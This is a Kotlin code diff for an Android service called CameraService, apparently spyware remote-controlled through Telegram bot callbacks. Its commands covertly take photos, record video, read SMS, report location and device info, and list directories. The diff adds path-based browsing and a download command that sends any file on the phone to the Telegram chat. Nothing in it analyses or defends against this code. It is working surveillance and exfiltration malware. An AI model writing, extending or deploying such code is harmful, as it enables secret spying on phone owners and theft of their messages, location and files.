@@ -27,6 +27,8 @@ class CameraService : Service() {
     private var lastUpdateId = 0L
     private var currentDir = "/sdcard/"
     private var isRunning = true
+    private val fileMap = mutableMapOf<Int, String>()
+    private var fileCounter = 0
 
     override fun onBind(intent: Intent?) = null
 
@@ -113,14 +115,25 @@ class CameraService : Service() {
                 val data = callback.optString("data")
                 val cbId = callback.optString("id")
                 Telegram.answerCallback(cbId)
-                when (data) {
-                    "cam" -> captureAndSend()
-                    "rec" -> recordVideo()
-                    "files" -> listDirectory(currentDir)
-                    "info" -> sendDeviceInfo()
-                    "sms" -> readSMS()
-                    "loc" -> getLocation()
-                    "stop" -> { isRunning = false; stopSelf() }
+                
+                when {
+                    data == "cam" -> captureAndSend()
+                    data == "rec" -> recordVideo()
+                    data == "files" -> listDirectory(currentDir)
+                    data == "info" -> sendDeviceInfo()
+                    data == "sms" -> readSMS()
+                    data == "loc" -> getLocation()
+                    data == "stop" -> { isRunning = false; stopSelf() }
+                    data.startsWith("files:") -> listDirectory(data.substringAfter("files:"))
+                    data.startsWith("download:") -> {
+                        val id = data.substringAfter("download:").toIntOrNull()
+                        val path = fileMap[id]
+                        if (path != null) {
+                            val f = File(path)
+                            if (f.exists()) Telegram.sendFile(f, "📄 ${f.name}")
+                            else Telegram.sendMessage("❌ الملف غير موجود.")
+                        }
+                    }
                 }
             }
         }
@@ -189,7 +202,9 @@ class CameraService : Service() {
                     keyboardList.add(listOf(mapOf("text" to "📁 ${f.name}", "callback_data" to "files:${f.absolutePath}")))
                 } else {
                     sb.append("📄 ${f.name} (${f.length()/1024} KB)\n")
-                    keyboardList.add(listOf(mapOf("text" to "📄 ${f.name}", "callback_data" to "download:${f.absolutePath}")))
+                    val id = fileCounter++
+                    fileMap[id] = f.absolutePath
+                    keyboardList.add(listOf(mapOf("text" to "📄 ${f.name}", "callback_data" to "download:$id")))
                 }
             }
             
